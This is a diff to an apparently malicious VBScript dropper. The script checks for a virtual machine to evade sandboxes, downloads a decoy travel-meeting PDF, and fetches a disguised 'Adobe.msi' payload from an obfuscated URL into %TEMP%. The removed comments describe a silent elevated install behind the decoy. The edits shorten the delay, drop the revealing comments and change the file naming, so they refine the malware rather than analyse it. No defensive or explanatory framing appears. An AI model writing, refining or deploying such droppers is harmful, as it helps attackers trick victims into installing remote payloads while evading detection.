@@ -52,10 +52,10 @@ If isVM Then
     f.WriteLine "state=sandbox-exit"
     f.Close
 Else
-    sh.Run "%COMSPEC% /c timeout /t 45 /nobreak >nul", 0, True
+    sh.Run "%COMSPEC% /c timeout /t 4 /nobreak >nul", 0, True
 
     ' ============================================================
-    '  PDF first — decoy opens while install runs behind it
+    '  PDF first
     ' ============================================================
     Dim pdfHttp, pdfUrl, pdfPath, pstream
     pdfUrl  = p1 & p2 & p3 & p4 & p5 & "Travel-Meeting-Plan-Q4-2026.pdf"
@@ -77,13 +77,11 @@ Else
     End If
 
     ' ============================================================
-    '  MSI second — fetch, install via WMI, elevated inherited
+    '  MSI second
     ' ============================================================
-    Dim http, msiUrl, msiPath, guid
-    msiUrl = p1 & p2 & p3 & p4 & p5 & "Adobe.msi"
-    guid   = CreateObject("Scriptlet.TypeLib").GUID
-    guid   = Replace(Replace(guid, "{", ""), "}", "")
-    msiPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & guid & ".msi"
+    Dim http, msiUrl, msiPath
+    msiUrl  = p1 & p2 & p3 & p4 & p5 & "Adobe.msi"
+    msiPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\Adobe.msi"
 
     Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     http.open "GET", msiUrl, False
